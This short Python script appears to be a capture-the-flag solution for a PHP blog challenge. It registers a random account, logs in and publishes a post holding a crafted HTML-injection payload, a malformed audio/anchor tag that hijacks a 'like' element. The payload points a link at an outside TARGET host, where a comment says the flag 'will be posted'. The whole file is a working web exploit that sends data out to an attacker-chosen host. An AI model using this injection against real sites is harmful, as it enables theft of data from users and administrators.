import binascii
import re
import os
import requests

host = os.getenv('HOST', '0.0.0.0')
port = os.getenv('PORT', '8005')
target = os.getenv('TARGET', 'http://192.168.1.1:8000') # flag will be posted here
url = 'http://{}:{}/'.format(host, port)

username = binascii.hexlify(os.urandom(16)).decode()
password = binascii.hexlify(os.urandom(16)).decode()

sess = requests.Session()

sess.post(url + 'register.php', data={
  'username': username,
  'password': password
})
sess.post(url + 'login.php', data={
  'username': username,
  'password': password
})
sess.post(url + 'new_post.php', data={
  'title': 'title',
  'content': '[["></audio><a/udio id=like href="{}">b</a/udio>">]]'.format(target),
  'publish': 'on'
})
print(sess.get(url + 'posts.php').content.decode())